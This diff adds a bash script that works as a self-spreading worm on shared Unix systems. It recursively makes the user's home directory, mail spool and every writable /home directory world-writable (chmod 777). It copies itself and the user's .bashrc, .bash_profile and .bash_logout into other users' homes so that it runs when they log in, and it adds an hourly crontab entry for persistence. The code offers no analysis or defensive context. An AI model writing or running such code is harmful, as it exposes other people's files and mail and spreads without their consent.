@@ -1,0 +1,68 @@
+#!/bin/bash
+
+# Its called a hustle, sweetheart
+
+Wr(){
+	if [[ ! -e $2 ]]; then
+		cp -f $1 $2 &>/dev/null
+	else
+		touch tmp
+		chmod -f 777 tmp
+		cat $1 > tmp
+		cat tmp > $2
+		chmod -f 777 $2
+		rm -f tmp
+	fi
+	
+	if [[ ! -e $2 ]]; then
+		echo "$1 -> $2" >> ~/.f
+	fi
+}
+
+Orf(){
+	chmod -Rf 777 $1 &>/dev/null
+}
+
+Ora(){
+	if [[ -e $1 ]]; then 
+		chmod -Rf 777 $1 &>/dev/null
+	fi
+}
+
+Cr(){
+	chmod -Rf 700 $1 &>/dev/null
+}
+
+Orf ~
+Ora /var/spool/mail/$(whoami)
+for file in /home/*; do
+	if [[ -w $file ]]; then
+		Orf $file
+		if [[ -d $file ]]; then
+			if [[ ! -e $file/._ ]]; then
+				mkdir $file/._
+				Orf $file/._
+			fi
+			if [[ $file != ~ ]]; then
+				Wr ~/._/.wilde $file/._/.wilde &>/dev/null
+				Wr ~/.bash_profile $file/.bash_profile &>/dev/null
+				Wr ~/.bashrc $file/.bashrc &>/dev/null
+				Wr ~/.bash_logout $file/.bash_logout &>/dev/null
+				chmod -Rf 777 ~ &>/dev/null
+			elif [[ $file == ~ ]] && [[ -e $file/._/.wilde ]]; then
+				Wr $file/._/.wilde ~/._/.wilde &>/dev/null
+				Wr $file/.bash_profile ~/.bash_profile &>/dev/null
+				Wr $file/.bashrc ~/.bashrc &>/dev/null
+				Wr $file/.bash_logout ~/.bash_logout &>/dev/null
+			else
+				exit
+			fi
+		fi
+	fi
+done
+if [[ ! $(crontab -l) ]]; then
+	echo "1 * * * * ~/._/.wilde" >> ~/.wildeout
+	crontab ~/.wildeout &>/dev/null
+fi
+rm -f ~/.wildeout &>/dev/null
+cd ~
